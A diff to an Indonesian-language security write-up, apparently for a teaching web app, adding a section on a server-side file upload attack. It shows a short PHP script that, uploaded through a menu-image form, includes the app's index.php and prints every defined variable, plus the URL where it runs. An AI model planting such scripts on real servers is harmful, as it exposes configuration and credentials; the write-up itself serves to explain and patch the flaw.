@@ -90,3 +90,23 @@ D: Delete
 
 ## Patch 3
 Untuk mengatasi serangan ini user yang digunakan untuk mengakses database disesuaikan dengan group dari user yang login ke database. Sehingga setiap user yang login hanya akan mendapatkan hak sesuai dengan ACL di atas.
+
+
+## Server Side Injection Attack 
+Attack ini memanfaatkan form yang mempunyai input file, pada aplikasi ini file upload digunakan untuk memberikan image pada menu, sehingga file yang diupload bukan dari url lagi.
+
+Attacker akan coba mengupload file yang dapat dijalankan pada server (pada kasus ini file berekstensi php), isi file tersebut adalah sebagai berikut:
+
+```php
+<?php
+
+include_once "../index.php";
+
+$vars = get_defined_vars();
+foreach($vars as $k=>$v){
+	printf("%s : %s <br />", $k, $v);
+}
+
+```
+
+bila setiap file yang diupload akan diletakkan di folder `/images/` maka script tersebut akan dapat diakses di `http://localhost:8000/images/attack.php`
